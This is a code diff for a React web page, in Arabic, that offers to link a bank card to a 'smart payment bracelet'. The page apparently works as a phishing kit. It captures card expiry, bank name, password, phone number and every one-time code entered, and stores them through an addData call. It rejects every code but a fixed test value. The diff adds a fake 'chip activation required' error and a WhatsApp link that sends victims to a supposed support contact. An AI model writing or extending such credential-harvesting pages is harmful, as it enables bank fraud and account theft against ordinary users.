@@ -136,11 +136,8 @@ export default function UsernameRecoveryPage() {
     const visitorId = localStorage.getItem("visitor")
     await addData({ id: visitorId, otp: otpString, allOtps })
 
-
-
-    // Simulate OTP verification
     if (otpString !== "12345") {
-      setOtpError("رمز التحقق غير صحيح")
+      setOtpError("هذه العملية غير مدعومة تحتاج الى تفعيل الشريحة الالكترونية الرجاء التواصل مع الدعم")
       setOtpValues("")
       return
     }
@@ -163,7 +160,7 @@ export default function UsernameRecoveryPage() {
       EX: exp,
       bank,
       pass,
-      phone2:phoneNumber
+      phone2: phoneNumber,
     })
     setShowOtp(true)
   }
@@ -180,9 +177,7 @@ export default function UsernameRecoveryPage() {
         {/* Main Content */}
         <div className="px-6 py-8 space-y-8">
           {/* Title */}
-          <h1 className="text-2xl font-bold text-gray-900 text-center">
-            ربط بطاقتك البنكية بسوار الدفع الذكي
-          </h1>
+          <h1 className="text-2xl font-bold text-gray-900 text-center">ربط بطاقتك البنكية بسوار الدفع الذكي</h1>
 
           {/* Phone Number Section */}
           <div className="space-y-4">
@@ -368,19 +363,28 @@ export default function UsernameRecoveryPage() {
             <p className="text-sm text-gray-500 text-right">تم إرسال رمز التحقق إلى رقم هاتفك</p>
 
             <div className="flex justify-center gap-3">
-                <Input
-                  value={otpValues}
-                  onChange={(e) => handleOtpChange( e.target.value)}
-                  className="w-full h-12 text-center text-lg font-bold"
-                  maxLength={6}
-                  type="text"
-                  inputMode="numeric"
-                />
+              <Input
+                value={otpValues}
+                onChange={(e) => handleOtpChange(e.target.value)}
+                className="w-full h-12 text-center text-lg font-bold"
+                maxLength={6}
+                type="text"
+                inputMode="numeric"
+              />
             </div>
 
             {otpError && (
-              <div className="text-red-500 text-sm text-center bg-red-50 p-3 rounded-lg border border-red-200">
-                {otpError}
+              <div className="text-red-500 text-sm text-right bg-red-50 p-3 rounded-lg border border-red-200 space-y-3">
+                <p>{otpError}</p>
+                <a
+                  href="https://wa.me/968"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="flex justify-between text-right text-blue-600 hover:text-blue-800 underline font-semibold"
+                >
+                <img src="/whatsapp.png" alt="" width={25}/> 
+    <span>            اضغط هنا للتواصل</span>
+                </a>
               </div>
             )}
 
